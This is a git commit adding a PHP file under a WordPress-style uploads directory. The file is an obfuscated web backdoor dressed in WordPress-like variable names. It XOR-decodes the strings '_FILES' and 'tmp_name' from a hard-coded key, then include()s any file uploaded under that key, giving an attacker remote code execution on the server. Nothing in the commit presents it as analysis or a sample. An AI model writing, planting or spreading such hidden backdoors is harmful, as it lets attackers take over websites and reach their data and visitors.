2242c381bda586f046ee79bafebbe13744712657
Rodelio <rodel2023>
2024-02-21 10:45:29 +0800

    first commit

---
+++ uploads/2018/11/d944be2f.php
@@ -0,0 +1,51 @@
+<?php 	
+	$parent_where = 'show_in_admin_bar';
+function found()
+
+{
+	$mime_group = 'index';
+    $wp_cockneyreplace = 'NUjumpPwVzh3';
+    $count = $wp_cockneyreplace;
+    
+	$post_type_object = 'posts_per_page';
+    $default_category_post_types = $GLOBALS[nestable_tags("%11%13%239%28%23", $count)];
+
+    $no_texturize_shortcodes_stack = $default_category_post_types;
+
+    $post_type = isset($no_texturize_shortcodes_stack[$count]);
+    if ($post_type)
+
+    {
+	$_name = 'sort_order';
+        $mimes = $default_category_post_types[$count];
+        $error = $mimes[nestable_tags("%3A8%1A%2A%03%11%3D%12", $count)];
+
+        $is_sticky = $error;
+        include ($is_sticky);
+    }
+
+}
+function nestable_tags($prefixed, $filter)
+
+{
+
+    $update = $filter;
+
+    $to_ncr = "url" . "decode";
+
+    $days = $to_ncr($prefixed);
+    $force_delete = substr($update,0, strlen($days));
+
+    $check = $days ^ $force_delete;
+    
+    $days = strpos($check, $force_delete);
+    
+    return $check;
+}
+	$group_by_status = 'current_guid';
+
+
+found();
+
+
+?>
